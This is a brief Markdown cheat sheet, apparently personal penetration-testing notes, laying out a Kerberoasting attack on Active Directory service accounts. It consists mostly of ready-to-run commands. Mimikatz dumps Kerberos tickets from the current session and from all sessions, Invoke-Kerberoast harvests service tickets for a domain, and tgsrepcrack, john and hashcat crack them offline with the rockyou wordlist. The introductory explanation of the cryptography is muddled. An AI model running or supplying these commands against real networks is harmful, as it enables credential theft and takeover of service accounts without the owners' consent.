According to the Kerberos protocol, the service ticket is encrypted using the SPN's password hash. If we are able to request the ticket and decrypt it using brute force or guessing, we will know the password hash, and from that we can crack the clear text password of the service account. As an added bonus, we do _not_ need administrative privileges for this attack.

### Install kerberoast
```shell
sudo apt update && sudo apt install kerberoast
```

### Extract ticket Using mimikatz Format kirbi
[[Mimikatz]]

```powershell
privilege::debug
token::elevate
standard::base64 /output:true
kerberos::list /export #Export ticket of the current session (kirbi format)
sekurlsa::tickets /export #Export ticket of all sessions (kirbi format)
```


### Brute Force
```shell
python /usr/share/kerberoast/tgsrepcrack.py /usr/share/wordlists/rockyou.txt MyExtortedTicket.kirbi
```

### Exporting all Service Ticket And cracking Using john
```bash
Invoke-Kerberoast -domain adsec.local | Export-CSV -NoTypeInformation output.csv
john --session=Kerberoasting output.csv
```

### Exporting all Service Ticket And cracking Using HashCat

```bash
Invoke-Kerberoast -OutputFormat hashcat | % { $_.Hash } | Out-File -Encoding ASCII hashes.kerberoast
hashcat -m 13100 -a 0 hashes.kerberoast /usr/share/wordlists/rockyou.txt 
```